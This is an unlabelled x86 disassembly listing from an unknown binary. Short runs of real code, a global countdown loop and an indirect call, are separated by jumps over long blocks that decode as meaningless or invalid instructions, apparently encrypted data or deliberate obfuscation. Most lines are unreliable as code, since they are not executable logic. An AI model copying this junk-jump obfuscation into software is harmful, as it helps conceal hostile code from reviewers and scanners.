  40ea85:	mov    DWORD PTR [ecx-0x691a4f6d],eax
  40ea8b:	push   ecx
  40ea8c:	or     al,0x65
  40ea8e:	jno    0x40ea21
  40ea90:	add    ah,bl
  40ea92:	(bad)  
  40ea93:	mov    fs,WORD PTR [edi-0x79ab317]
  40ea99:	ror    DWORD PTR [edi+0x2be0ea3c],1
  40ea9f:	cli    
  40eaa0:	inc    ebp
  40eaa1:	les    ecx,FWORD PTR [edi]
  40eaa3:	test   DWORD PTR [esi+0x3000000],esp
  40eaa9:	retf   0x458b
  40eaac:	or     BYTE PTR [ecx+0x443cd9],al
  40eab2:	add    BYTE PTR [ebx+0x1513f04d],cl
  40eab8:	in     eax,0xfc
  40eaba:	inc    edx
  40eabb:	add    BYTE PTR [ebx],dh
  40eabd:	mov    BYTE PTR [ebx],0xc7
  40eac0:	mov    DWORD PTR [ecx],eax
  40eac2:	sbb    ecx,0x77dc
  40eac8:	mov    eax,DWORD PTR [ebp-0x10]
  40eacb:	adc    ecx,0x4d7b
  40ead1:	mov    ecx,DWORD PTR [ebp-0x14]
  40ead4:	mov    DWORD PTR ds:0x42e128,0x11
  40eade:	cmp    DWORD PTR ds:0x42e128,0x0
  40eae5:	je     0x40eb43
  40eaeb:	cmp    DWORD PTR ds:0x42e128,0x2
  40eaf2:	jne    0x40eb15
  40eaf8:	push   0x42e130
  40eafd:	push   0x42e16f
  40eb02:	push   0x1c20
  40eb07:	push   DWORD PTR [ebp-0x10]
  40eb0a:	push   0x848e
  40eb0f:	call   DWORD PTR ds:0x42e30f
  40eb15:	cmp    DWORD PTR ds:0x42e128,0x3
  40eb1c:	jne    0x40eb31
  40eb22:	xor    edx,edx
  40eb24:	or     edx,DWORD PTR ds:0x42e128
  40eb2a:	dec    edx
  40eb2b:	mov    DWORD PTR ds:0x42e128,edx
  40eb31:	mov    edx,DWORD PTR ds:0x42e128
  40eb37:	dec    edx
  40eb38:	mov    DWORD PTR ds:0x42e128,edx
  40eb3e:	jmp    0x40eade
  40eb43:	xor    ecx,esi
  40eb45:	mov    edx,0xffcd8d64
  40eb4a:	sub    edx,ecx
  40eb4c:	add    DWORD PTR [eax],edx
  40eb4e:	mov    eax,ds:0x41b27c
  40eb53:	mov    eax,DWORD PTR [eax]
  40eb55:	mov    cx,WORD PTR [ebp-0x4]
  40eb59:	movzx  ecx,cx
  40eb5c:	add    ecx,DWORD PTR [eax]
  40eb5e:	mov    DWORD PTR [ebp-0x1c],ecx
  40eb61:	mov    eax,DWORD PTR [ebp+0xc]
  40eb64:	mov    ecx,DWORD PTR [ebp+0xc]
  40eb67:	xor    eax,esi
  40eb69:	lea    eax,[eax+eax*1+0x32729c]
  40eb70:	xor    ecx,esi
  40eb72:	sub    ecx,eax
  40eb74:	mov    ax,WORD PTR [ebp-0x4]
  40eb78:	movzx  eax,ax
  40eb7b:	jmp    0x40ece5
  40eb80:	or     BYTE PTR [edi],dl
  40eb82:	shr    BYTE PTR [edx-0x31],0x71
  40eb86:	mov    dl,0x71
  40eb88:	inc    eax
  40eb89:	(bad)  
  40eb8a:	pop    esp
  40eb8b:	mov    ch,0x2b
  40eb8d:	sub    BYTE PTR [ebx],ch
  40eb8f:	sahf   
  40eb90:	imul   DWORD PTR [edi+0x7fc37070]
  40eb96:	jo     0x40ec08
  40eb98:	(bad)  
  40eb99:	jl     0x40eb91
  40eb9b:	dec    BYTE PTR [edi+0x4113b1fb]
  40eba1:	mov    edi,0xdd3e3a63
  40eba6:	imul   esp,DWORD PTR [edx-0x1027f386],0x5a
  40ebad:	sub    ecx,DWORD PTR [esi+0x38]
  40ebb0:	popa   
  40ebb1:	pop    ss
  40ebb2:	jno    0x40eb83
  40ebb4:	dec    eax
  40ebb5:	clc    
  40ebb6:	xchg   ebp,eax
  40ebb7:	add    eax,0x36885030
  40ebbc:	push   ebx
  40ebbd:	pop    ebx
  40ebbe:	clc    
  40ebbf:	popa   
  40ebc0:	ret    
  40ebc1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ebc2:	mov    BYTE PTR [edx],al
  40ebc4:	inc    edi
  40ebc5:	pushf  
  40ebc6:	cmc    
  40ebc7:	aas    
  40ebc8:	jg     0x40eb57
  40ebca:	lahf   
  40ebcb:	xor    DWORD PTR [esi],ecx
  40ebcd:	loopne 0x40eb5d
  40ebcf:	sub    al,0x43
  40ebd1:	sbb    al,0xc0
  40ebd3:	add    DWORD PTR [ebx+0x48],0xffffffd6
  40ebd7:	sar    esi,cl
  40ebd9:	jo     0x40eb5e
  40ebdb:	nop
  40ebdc:	sub    eax,0x5a3461f7
  40ebe1:	push   cs
  40ebe2:	in     al,dx
  40ebe3:	and    BYTE PTR [ecx-0x36],bh
  40ebe6:	mov    BYTE PTR [edx-0x2084df06],bl
  40ebec:	xadd   dh,ah
  40ebef:	into   
  40ebf0:	cli    
  40ebf1:	inc    esp
  40ebf2:	xchg   esp,eax
  40ebf3:	ins    DWORD PTR es:[edi],dx
  40ebf4:	ins    DWORD PTR es:[edi],dx
  40ebf5:	xchg   ebx,eax
  40ebf6:	xchg   esp,eax
  40ebf7:	xchg   edx,eax
  40ebf8:	mov    ds:0xaabb0463,eax
  40ebfd:	mov    edx,0x56dd1178
  40ec02:	sbb    al,0xdf
  40ec04:	adc    edx,DWORD PTR [ebx+0x21]
  40ec07:	sub    ebx,DWORD PTR [edi+0x51]
  40ec0a:	test   BYTE PTR [eax-0x4b],dh
  40ec0d:	xor    ebx,DWORD PTR [edx-0x1e]
  40ec10:	loope  0x40ec09
  40ec12:	icebp  
  40ec13:	imul   ecx,ebx,0x23
  40ec16:	loopne 0x40ebf6
  40ec18:	push   ebp
  40ec19:	push   eax
  40ec1a:	add    edx,DWORD PTR [eax]
  40ec1c:	or     al,0xe
  40ec1e:	int    0xdb
  40ec20:	and    al,0x17
  40ec22:	repz xlat BYTE PTR ds:[ebx]
  40ec24:	xchg   esi,eax
  40ec25:	clc    
  40ec26:	mov    ds,WORD PTR [esi+0x4be9858e]
  40ec2c:	push   0xb24a434f
  40ec31:	add    al,0xf1
  40ec33:	cmp    dl,dl
  40ec35:	mov    edx,DWORD PTR [edi]
  40ec37:	std    
  40ec38:	pop    esi
  40ec39:	into   
  40ec3a:	jno    0x40ebf1
  40ec3c:	mov    al,ds:0xd5443f8f
  40ec41:	sbb    DWORD PTR [ecx-0x3ef36d58],0x40
  40ec48:	mov    edx,DWORD PTR [ecx+edx*1+0x5b]
  40ec4c:	test   al,0xea
  40ec4e:	lds    ebx,FWORD PTR [esi+ebp*1+0x76dbb6be]
  40ec55:	xchg   esi,eax
  40ec56:	push   ss
  40ec57:	(bad)  
  40ec58:	aad    0xc
  40ec5a:	inc    eax
  40ec5b:	neg    esp
  40ec5d:	xchg   ecx,eax
  40ec5e:	js     0x40ecd4
  40ec60:	dec    ebx
  40ec61:	mov    bh,BYTE PTR [eax+0x0]
  40ec64:	outs   dx,DWORD PTR ds:[esi]
  40ec65:	mov    eax,ds:0xe4401dc
  40ec6a:	div    BYTE PTR [esi+0x4e339349]
  40ec70:	(bad)  
  40ec71:	(bad)  
  40ec72:	lds    eax,FWORD PTR ds:0xe3ada4e6
  40ec78:	jmp    0x1409:0xd2a07aa
  40ec7f:	mov    ds:0x51a26ceb,al
  40ec84:	in     eax,0x26
  40ec86:	mov    es,WORD PTR [eax]
  40ec88:	sti    
  40ec89:	cdq    
  40ec8a:	out    dx,eax
  40ec8b:	ja     0x40ecb0
  40ec8d:	mov    WORD PTR [eax+esi*2+0x30],gs
  40ec91:	and    eax,eax
  40ec93:	or     ah,BYTE PTR [ebp-0x5f]
  40ec96:	pop    eax
  40ec97:	cld    
  40ec98:	mov    eax,ds:0x55554464
  40ec9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ec9e:	or     DWORD PTR [ebx-0x59],0x65d6be76
  40eca5:	xor    edi,DWORD PTR [edx-0x9]
  40eca8:	push   0xffffffa0
  40ecaa:	loop   0x40ec3d
  40ecac:	pop    esp
  40ecad:	xchg   DWORD PTR [ecx+0x70],esp
  40ecb0:	xor    DWORD PTR [ebx+0x70],edx
  40ecb3:	push   es
  40ecb4:	jge    0x40ec43
  40ecb6:	xchg   DWORD PTR [eax-0x48],esi
  40ecb9:	ds push ebp
  40ecbb:	inc    ebx
  40ecbc:	push   edi
  40ecbd:	and    BYTE PTR [ebx-0x7f],dh
  40ecc0:	mov    cl,0x98
  40ecc2:	xor    DWORD PTR [ecx+ebp*2],esp
  40ecc5:	retf   
  40ecc6:	mov    esi,0xb971ffc1
  40eccb:	adc    DWORD PTR [ecx-0x5fa93c8e],ecx
  40ecd1:	mov    esp,DWORD PTR [eax]
  40ecd3:	jge    0x40ecf2
  40ecd5:	mov    cl,0x56
  40ecd7:	dec    edi
  40ecd8:	fld    DWORD PTR [ecx]
  40ecda:	add    ebx,ebx
  40ecdc:	fisub  DWORD PTR [eax+0x43e0d483]
  40ece2:	sbb    edi,DWORD PTR [ebx]
  40ece4:	fidivr WORD PTR [ebx]
  40ece6:	ror    DWORD PTR [ebx-0x48f013bb],0x4d
  40eced:	cld    
  40ecee:	jmp    0x40ee58
  40ecf3:	movntps XMMWORD PTR [edi+edi*8+0x64],xmm4
  40ecf8:	push   edi
  40ecf9:	rep stos DWORD PTR es:[edi],eax
  40ecfb:	mov    dh,0x81
  40ecfd:	push   ebx
  40ecfe:	jle    0x40ec98
  40ed00:	or     DWORD PTR [eax+0x70aeba33],edi
  40ed06:	jo     0x40eccb
  40ed08:	jg     0x40ed7a
  40ed0a:	jo     0x40ecbb
  40ed0c:	fstp   st(2)
  40ed0e:	mov    WORD PTR [eax],?
  40ed10:	bound  ebx,QWORD PTR [eax]
  40ed12:	sahf   
  40ed13:	outs   dx,DWORD PTR ds:[esi]
  40ed14:	fidivr WORD PTR [ebp-0x37c4e87f]
  40ed1a:	and    bl,BYTE PTR [ecx+0x1]
  40ed1d:	cmp    eax,0xaa94a8e6
  40ed22:	hlt    
  40ed23:	dec    esp
  40ed24:	in     eax,dx
  40ed25:	mov    dh,0x6c
  40ed27:	xchg   BYTE PTR [esi],dh
  40ed29:	mov    edx,edx
  40ed2b:	jb     0x40ece9
  40ed2d:	push   edi
  40ed2e:	xchg   edi,eax
  40ed2f:	cdq    
  40ed30:	mov    esi,0x45028492
  40ed35:	push   ebx
  40ed36:	inc    edx
  40ed37:	dec    esi
  40ed38:	mov    bl,0x6f
  40ed3a:	fdiv   st,st(2)
  40ed3c:	fwait
  40ed3d:	ror    edi,1
  40ed3f:	pop    ebx
  40ed40:	add    cl,dh
  40ed42:	dec    ebx
  40ed43:	pop    eax
  40ed44:	lds    esi,FWORD PTR [eax+0x4aad6226]
  40ed4a:	cmp    DWORD PTR [esi-0x43b12f11],edi
  40ed50:	pop    ss
  40ed51:	jle    0x40edb6
  40ed53:	das    
  40ed54:	aam    0x8
  40ed56:	adc    ah,BYTE PTR [edi]
  40ed58:	das    
  40ed59:	fnstenv [ecx+0x14]
  40ed5c:	loop   0x40ed88
  40ed5e:	sbb    BYTE PTR [edi],ah
  40ed60:	pusha  
  40ed61:	xor    dl,BYTE PTR [esi+0x559c588]
  40ed67:	imul   eax,edx,0xff891e95
  40ed6d:	sub    eax,0x17118348
  40ed72:	lds    ecx,FWORD PTR [ebp+0x55]
  40ed75:	xlat   BYTE PTR ds:[ebx]
  40ed76:	fs jbe 0x40ed2b
  40ed79:	std    
  40ed7a:	mov    dh,0x7e
  40ed7c:	xor    ebx,esp
  40ed7e:	not    BYTE PTR [edi+0x7f]
  40ed81:	div    DWORD PTR [edx+0x61c0fec1]
  40ed87:	cld    
  40ed88:	mov    es,WORD PTR [edx-0x7a872757]
  40ed8e:	std    
  40ed8f:	sbb    eax,0xa1f533ed
  40ed94:	test   al,0x26
  40ed96:	xor    BYTE PTR [eax+0x2c393544],ch
  40ed9c:	repz mov al,ds:0xb9d1ef03
  40eda2:	and    al,0x4c
  40eda5:	int3   
  40eda6:	shr    BYTE PTR [edx+0x27],cl
  40eda9:	(bad)  
  40edaa:	or     eax,0x4745dc38
  40edaf:	mov    ch,BYTE PTR [ebx-0x24]
  40edb2:	mov    al,0xe9
  40edb4:	jae    0x40ed8c
  40edb6:	inc    esi
  40edb7:	int    0x17
  40edb9:	jecxz  0x40edbb
  40edbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40edbc:	jmp    0x40ed62
  40edbe:	scas   eax,DWORD PTR es:[edi]
  40edbf:	xlat   BYTE PTR ds:[ebx]
  40edc0:	xchg   bh,cl
  40edc2:	inc    ebx
  40edc3:	mul    BYTE PTR [edx]
  40edc5:	test   DWORD PTR ds:0x49049b14,0xb737bc02
  40edcf:	rcr    esp,1
  40edd1:	jp     0x40ed6a
  40edd3:	rol    eax,1
  40edd5:	cmp    DWORD PTR [eax],ebx
  40edd7:	or     al,0x3
  40edd9:	neg    BYTE PTR [ebx-0x16]
  40eddc:	mov    esp,0x7a83315c
  40ede1:	pop    esp
  40ede2:	pop    edx
  40ede3:	aas    
  40ede4:	daa    
  40ede5:	jns    0x40edae
  40ede7:	rcl    DWORD PTR [eax],cl
  40ede9:	sbb    al,0xce
  40edeb:	inc    ecx
  40edec:	inc    edx
  40eded:	(bad)  
  40edf1:	jns    0x40edd8
  40edf3:	push   ebx
  40edf4:	int3   
  40edf5:	adc    BYTE PTR [ebx+0x1cb41634],cl
  40edfb:	cmp    al,0xb8
  40edfd:	xchg   ecx,eax
  40edfe:	shl    DWORD PTR [edi+esi*1-0x52786c7e],cl
  40ee05:	cs xor ax,0xbc4c
  40ee0a:	pop    edi
  40ee0b:	mul    BYTE PTR [si-0x3ca4]
  40ee10:	ror    BYTE PTR [ebx+0x46c14594],1
  40ee16:	fwait
  40ee17:	in     eax,0xf2
  40ee19:	sub    al,0x4b
  40ee1b:	pop    edx
  40ee1c:	xchg   BYTE PTR [esp+ebx*4+0x91f17dd],dl
  40ee23:	and    eax,0xc73c6fcf
  40ee28:	mov    ds:0xc6691f99,al
  40ee2d:	inc    esp
  40ee2e:	aaa    
  40ee2f:	or     al,0xd9
  40ee31:	mov    bh,0xa
  40ee33:	push   eax
  40ee34:	retf   
  40ee35:	cmp    ch,0x3b
  40ee38:	daa    
  40ee39:	popa   
  40ee3a:	cmp    ecx,DWORD PTR [eax+0x74]
  40ee3d:	clc    
  40ee3e:	dec    edx
  40ee3f:	in     al,dx
  40ee40:	pop    ds
  40ee41:	mov    ch,0x56
  40ee43:	jmp    0x29c722d9
  40ee48:	pushf  
  40ee49:	and    BYTE PTR [esi],ch
  40ee4b:	mov    ah,0x20
  40ee4d:	ja     0x40edd9
  40ee4f:	mov    esp,0x67861632
  40ee54:	sub    al,0x88
  40ee56:	out    0x79,al
  40ee58:	jg     0x40efd7
  40ee5e:	xor    eax,esi
  40ee60:	sub    ecx,eax
  40ee62:	sub    ecx,edi
  40ee64:	mov    WORD PTR [ebp-0x4],cx
  40ee68:	jmp    0x40efe4
  40ee6d:	jmp    0x40efd7
  40ee72:	int3   
  40ee73:	push   ebp
  40ee74:	(bad)  
  40ee75:	icebp  
  40ee76:	xchg   ecx,eax
  40ee77:	icebp  
  40ee78:	je     0x40eeef
  40ee7a:	in     al,0x65
  40ee7c:	pop    edx
  40ee7d:	mov    cl,0x4a
  40ee7f:	adc    DWORD PTR [eax],ecx
  40ee81:	pop    ds
  40ee82:	or     eax,0xc37070ac
  40ee87:	jg     0x40eef9
  40ee89:	jo     0x40ee7c
  40ee8b:	js     0x40ee71
  40ee8d:	out    dx,al
  40ee8e:	mov    bh,0xb1
  40ee90:	xor    esp,DWORD PTR [edi]
  40ee92:	mov    al,0xf
  40ee94:	cmp    dh,al
  40ee96:	sti    
  40ee97:	sub    al,0x58
  40ee99:	mov    ds:0xa8faa6d0,al
  40ee9e:	scas   eax,DWORD PTR es:[edi]
  40ee9f:	ss aad 0x13
  40eea2:	dec    edi
  40eea3:	or     eax,0x21
  40eea6:	jp     0x40ee6b
  40eea8:	cmp    dl,ch
  40eeaa:	(bad)  
  40eeab:	cmp    eax,0x5975875d
  40eeb0:	sbb    BYTE PTR ds:0xafe896e4,dl
  40eeb6:	jno    0x40eef1
  40eeb8:	rcr    BYTE PTR [ecx-0x52],cl
  40eebb:	jb     0x40ef0c
  40eebd:	ins    DWORD PTR es:[edi],dx
  40eebe:	adc    eax,0x2e05d796
  40eec3:	sbb    DWORD PTR [ebx+0x3d968f81],0xffffffab
  40eeca:	xor    ebx,ebx
  40eecc:	je     0x40ee91
  40eece:	in     eax,dx
  40eecf:	mov    dh,0x5
  40eed1:	mov    al,0xd1
  40eed3:	inc    esp
  40eed4:	pop    edi
  40eed5:	push   eax
  40eed6:	je     0x40eea9
  40eed8:	jnp    0x40eece
  40eeda:	sub    eax,0xe0e78967
  40eedf:	inc    ebp
  40eee0:	mov    dh,0x2e
  40eee2:	mov    bh,0xb7
  40eee4:	outs   dx,BYTE PTR ds:[esi]
  40eee5:	int3   
  40eee6:	in     eax,dx
  40eee7:	inc    eax
  40eee8:	xor    esi,DWORD PTR [eax-0x59]
  40eeeb:	xchg   BYTE PTR [ebx-0x1b],dh
  40eeee:	jmp    0x40ee75
  40eef0:	fst    DWORD PTR [edi+0x5d92cc91]
  40eef6:	stos   DWORD PTR es:[edi],eax
  40eef7:	mov    dl,0xbf
  40eef9:	pop    ds
  40eefa:	sub    DWORD PTR [ebx+0x79],edi
  40eefd:	outs   dx,DWORD PTR ds:[esi]
  40eefe:	jmp    0xede4:0x7560a7b6
  40ef05:	adc    eax,0x6e43fec0
  40ef0a:	fidiv  DWORD PTR [eax]
  40ef0c:	jecxz  0x40ef78
  40ef0e:	xor    al,0xf0
  40ef10:	push   esp
  40ef11:	dec    ecx
  40ef12:	xchg   esi,eax
  40ef13:	in     eax,dx
  40ef14:	call   0x7d8ccccd
  40ef19:	push   esp
  40ef1a:	push   edx
  40ef1b:	inc    ebx
  40ef1c:	mov    esp,0x8f7dea8a
  40ef21:	or     ecx,ebp
  40ef23:	push   0x2c424575
  40ef28:	sbb    eax,0x5d24b0fb
  40ef2d:	icebp  
  40ef2e:	push   edi
  40ef2f:	lahf   
  40ef30:	xor    al,0x4b
  40ef32:	push   esi
  40ef33:	cmp    BYTE PTR [esi+ecx*8+0x3d],al
  40ef37:	pop    ebx
  40ef38:	push   cs
  40ef39:	in     eax,dx
  40ef3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ef3b:	pop    edi
  40ef3c:	pop    ebx
  40ef3d:	xchg   esp,eax
  40ef3e:	dec    edi
  40ef3f:	call   0x5c949974
  40ef44:	cmp    al,0x3d
  40ef46:	sbb    al,BYTE PTR [ecx]
  40ef48:	push   ds
  40ef49:	(bad)  
  40ef4b:	(bad)  
  40ef4c:	push   ebp
  40ef4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ef4e:	fadd   DWORD PTR [edx-0x7]
  40ef51:	(bad)  
  40ef52:	test   al,0x63
  40ef55:	and    edx,DWORD PTR [esi-0x11899da7]
  40ef5b:	push   es
  40ef5c:	and    BYTE PTR [ebx-0x76],al
  40ef5f:	xchg   ebx,eax
  40ef60:	dec    eax
  40ef61:	fwait
  40ef62:	xchg   edx,eax
  40ef63:	cmp    cl,BYTE PTR ds:0xa630eaee
  40ef69:	cs xchg edx,eax
  40ef6b:	cmp    cl,BYTE PTR [eax]
  40ef6d:	jle    0x40ef96
  40ef6f:	cmp    BYTE PTR [esi+0x57e866b6],bl
  40ef75:	and    eax,0x57cafa82
  40ef7a:	daa    
  40ef7b:	inc    ecx
  40ef7c:	cld    
  40ef7d:	mov    dh,0xfd
  40ef7f:	test   BYTE PTR [edi-0x62],bl
  40ef82:	sbb    al,0x1d
  40ef84:	aad    0x56
  40ef86:	add    cl,BYTE PTR [esp]
  40ef89:	push   0x49
  40ef8b:	pop    esi
  40ef8c:	iret   
  40ef8d:	in     eax,0x44
  40ef8f:	out    dx,eax
  40ef90:	xchg   ebx,eax
  40ef91:	std    
  40ef92:	les    edx,FWORD PTR [edi]
  40ef94:	aas    
  40ef95:	mov    esi,0x1630a7d2
  40ef9a:	cwde   
  40ef9b:	out    dx,al
  40ef9c:	dec    ebp
  40ef9d:	in     eax,0x88
  40ef9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40efa0:	loopne 0x40ef8f
  40efa2:	xchg   ecx,eax
  40efa3:	mov    edx,0xef3a9dd3
  40efa8:	push   eax
  40efa9:	neg    BYTE PTR [ebx-0x7901d719]
  40efaf:	ins    BYTE PTR es:[edi],dx
  40efb0:	je     0x40ef94
  40efb2:	pop    edx
  40efb3:	in     al,dx
  40efb4:	sti    
  40efb5:	xor    edi,DWORD PTR [ecx]
  40efb7:	aas    
  40efb8:	(bad)  
  40efb9:	fisubr WORD PTR [edx]
  40efbb:	das    
  40efbc:	inc    eax
  40efbd:	mov    ecx,0xa27f58a8
  40efc2:	mov    BYTE PTR [edi-0x20],bh
  40efc5:	fisubr WORD PTR [edi-0x4067060e]
  40efcb:	fwait
  40efcc:	mov    dl,BYTE PTR [esi+0x27225102]
  40efd2:	cmp    BYTE PTR [ecx+0x3b],ch
  40efd5:	and    al,0x7d
  40efd7:	xor    eax,esi
  40efd9:	lea    eax,[eax+ecx*1+0x32729c]
  40efe0:	mov    WORD PTR [ebp-0x4],ax
  40efe4:	mov    eax,DWORD PTR [ebp-0xc]
  40efe7:	cmp    eax,ebx
  40efe9:	jmp    0x40f153
  40efee:	mov    cs,WORD PTR [ebx]
  40eff0:	enter  0x51c7,0xc3
  40eff4:	lea    edx,[ecx+0x2a]
  40eff7:	leave  
  40eff8:	inc    esi
  40eff9:	inc    ebx
  40effa:	pusha  
  40effb:	xchg   DWORD PTR [edx+0x46],edx
  40effe:	shr    BYTE PTR [ebx+0x7fc37070],1
  40f004:	jo     0x40f076
  40f006:	rcl    BYTE PTR [ecx+ebx*8+0x6a],cl
  40f00a:	add    ah,BYTE PTR [ebp+0x45f82c3e]
  40f010:	mov    cl,0xa3
  40f012:	clc    
  40f013:	retf   
  40f014:	hlt    
  40f015:	test   al,0xb9
  40f017:	jno    0x40f04c
  40f019:	enter  0xd87,0x53
  40f01d:	pushf  
  40f01e:	ins    BYTE PTR es:[edi],dx
  40f01f:	cli    
  40f020:	push   es
  40f021:	dec    ebx
  40f022:	mov    ebx,0xfd89fbe6
  40f027:	(bad)  
  40f028:	into   
  40f029:	xchg   DWORD PTR [edx+0x3c7f94b6],ebp
  40f02f:	test   al,0x7
  40f031:	and    edx,esi
  40f033:	ins    DWORD PTR es:[edi],dx
  40f034:	out    dx,eax
  40f035:	jp     0x40f05e
  40f037:	sub    DWORD PTR [edx+ebp*8-0x1018d555],edx
  40f03e:	sbb    eax,DWORD PTR [eax+0xfe4b393]
  40f044:	mov    esi,0x17ad21d1
  40f049:	mov    eax,0x5ef86997
  40f04e:	xor    BYTE PTR [esi-0x21],dh
  40f051:	mov    esp,0x18e9e88c
  40f056:	pusha  
  40f057:	aad    0xd0
  40f059:	stc    
  40f05a:	imul   ebp,DWORD PTR [ebp+ecx*8-0x25],0x95c324e3
  40f062:	into   
  40f063:	jmp    FWORD PTR [esi+esi*2+0x64ef2e03]
  40f06a:	int    0x1f
  40f06c:	jns    0x40f034
  40f06e:	das    
  40f06f:	push   ebx
  40f070:	mov    ebp,0xe312499b
  40f075:	sub    dl,BYTE PTR [eax+0x67]
  40f078:	push   es
  40f079:	repz pop ebp
  40f07b:	(bad)  
  40f07c:	sti    
  40f07d:	inc    esi
  40f07e:	jg     0x40f0c8
  40f080:	or     ebp,DWORD PTR [ebx]
  40f082:	sub    eax,0xde389452
  40f087:	jb     0x40f028
  40f089:	inc    eax
  40f08a:	pop    eax
  40f08b:	push   0x42
  40f08d:	scas   al,BYTE PTR es:[edi]
  40f08e:	and    ebp,0xfa5e94ce
  40f094:	xor    BYTE PTR [eax-0x25bf1d0f],bh
  40f09a:	cmp    eax,0xc8b6ecc1
  40f09f:	in     al,0xb9
  40f0a1:	ret    0x54eb
  40f0a4:	inc    esp
  40f0a5:	shl    eax,1
  40f0a7:	mov    al,ds:0x386f34cb
  40f0ac:	clc    
  40f0ad:	jp     0x40f0b9
  40f0af:	daa    
  40f0b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f0b1:	and    edi,0xffffff8a
  40f0b4:	jecxz  0x40f0cd
  40f0b6:	add    eax,0x8790da8
  40f0bb:	sti    
  40f0bc:	retf   0x8792
  40f0bf:	xchg   esp,eax
  40f0c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f0c1:	jo     0x40f0af
  40f0c3:	pop    eax
  40f0c4:	test   dh,0xdd
  40f0c7:	rcl    ah,cl
  40f0c9:	sub    eax,0xbd1a641f
  40f0ce:	out    dx,al
  40f0cf:	clc    
  40f0d0:	or     eax,0xd98ea2ae
  40f0d5:	push   esp
  40f0d6:	push   edi
  40f0d7:	or     ebx,ecx
  40f0d9:	rcl    DWORD PTR [edx],cl
  40f0db:	cmc    
  40f0dc:	adc    ebp,DWORD PTR [edi]
  40f0de:	push   esp
  40f0df:	sub    BYTE PTR ds:0x656194bb,bh
  40f0e5:	add    eax,0x253e06e1
  40f0ea:	retf   0x4cdf
  40f0ed:	push   ds
  40f0ee:	xchg   ebp,eax
  40f0ef:	frndint 
  40f0f1:	mov    BYTE PTR [eax],bh
  40f0f3:	xor    esp,DWORD PTR [ebx-0x51]
  40f0f6:	test   BYTE PTR [ecx+eiz*2],0x79
  40f0fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f0fb:	fist   WORD PTR [ebx-0x57]
  40f0fe:	(bad)
  40f101:	xor    eax,0x7f8946a5
  40f106:	dec    esp
  40f107:	adc    cl,BYTE PTR [ebx+edi*2-0x4291f70b]
  40f10e:	and    eax,0xa8561c64
  40f113:	int3   
  40f114:	jecxz  0x40f0d1
  40f116:	ss std 
  40f118:	xchg   edi,eax
  40f119:	leave  
  40f11a:	sub    eax,0x16d9922c
  40f11f:	dec    edx
  40f120:	aas    
  40f121:	and    eax,0x4734db68
  40f126:	test   ch,bh
  40f128:	idiv   DWORD PTR [ebp+0x3a]
  40f12b:	adc    al,0xee
  40f12d:	jbe    0x40f134
  40f12f:	push   ebx
  40f130:	push   ds
  40f131:	or     eax,0x6c63b2fa
  40f136:	sbb    al,0x19
  40f138:	and    al,0x42
  40f13a:	retf   0x3d3e
  40f13d:	xlat   BYTE PTR ds:[ebx]
  40f13e:	add    esp,DWORD PTR [esi+eax*1]
  40f141:	jp     0x40f100
  40f143:	add    bl,0x35
  40f146:	push   ebp
  40f147:	fisub  DWORD PTR [ebp-0xaefb766]
  40f14d:	rcl    BYTE PTR [edi],cl
  40f14f:	in     al,0x8c
  40f151:	sub    al,0x6f
  40f153:	je     0x40f2d1
  40f159:	mov    eax,DWORD PTR [ebp-0x8]
  40f15c:	jmp    0x40f2c6
  40f161:	lods   eax,DWORD PTR ds:[esi]
  40f162:	ret    0xcc29
  40f165:	jno    0x40f15a
  40f167:	ins    DWORD PTR es:[edi],dx
  40f168:	popa   
  40f169:	fdivr  DWORD PTR [ecx]
  40f16b:	xchg   ecx,eax
  40f16c:	test   DWORD PTR [eax-0x3d],eax
  40f16f:	push   0x70aaa3a5
  40f174:	jo     0x40f139
  40f176:	jg     0x40f1e8
  40f178:	jo     0x40f1ca
  40f17a:	stc    
  40f17b:	add    edx,DWORD PTR [ecx+0x2c0e2343]
  40f181:	loope  0x40f124
  40f183:	inc    edi
  40f184:	(bad)  
  40f185:	shl    DWORD PTR [edx+0x5a],1
  40f188:	shl    DWORD PTR [ecx+0x5e],0xb6
  40f18c:	leave  
  40f18d:	mov    ebp,0x4dad95bd
  40f192:	inc    eax
  40f193:	or     eax,0x87f7d6d4
  40f198:	jmp    0x23b57bd0
  40f19d:	pop    edx
  40f19e:	test   al,0xfe
  40f1a0:	lds    ecx,FWORD PTR [ebx-0x60a78971]
  40f1a6:	outs   dx,BYTE PTR ds:[esi]
  40f1a7:	loope  0x40f171
  40f1a9:	pop    edx
  40f1aa:	cmp    bh,BYTE PTR [edx-0x28]
  40f1ad:	in     eax,dx
  40f1ae:	fidivr WORD PTR [esi-0x28e717e9]
  40f1b4:	or     al,0xe4
  40f1b6:	jb     0x40f1c1
  40f1b8:	int3   
  40f1b9:	sahf   
  40f1ba:	pop    esi
  40f1bb:	mov    ebp,0xdac3df3b
  40f1c0:	pop    eax
  40f1c1:	push   ds
  40f1c2:	addr16 int 0xa2
  40f1c5:	fidivr DWORD PTR [edx+ecx*8-0x5c17c074]
  40f1cc:	call   0x44142241
  40f1d1:	(bad)  
  40f1d2:	int3   
  40f1d3:	mov    edi,0x78a4cf7
  40f1d8:	sub    al,0xcd
  40f1da:	aad    0x90
  40f1dc:	(bad)  
  40f1dd:	fcmovb st,st(5)
  40f1df:	pusha  
  40f1e0:	lds    edx,FWORD PTR [eax]
  40f1e2:	sahf   
  40f1e3:	adc    ebx,DWORD PTR [ecx-0x1ee169da]
  40f1e9:	out    0x5f,al
  40f1eb:	inc    edi
  40f1ec:	ret    
  40f1ed:	test   esp,ecx
  40f1ef:	adc    eax,0x8cb43109
  40f1f4:	mov    ecx,0x1a7eed91
  40f1f9:	push   es
  40f1fa:	cmp    edi,0x72
  40f1fd:	xchg   ecx,ebx
  40f1ff:	popa   
  40f200:	fld    DWORD PTR [ebx-0x4b899181]
  40f206:	push   ebp
  40f207:	aaa    
  40f208:	xchg   edx,eax
  40f209:	nop
  40f20a:	(bad)  
  40f20b:	adc    BYTE PTR [eax],cl
  40f20d:	adc    al,0x33
  40f20f:	dec    edx
  40f210:	call   0xbc56:0x6e06c7ad
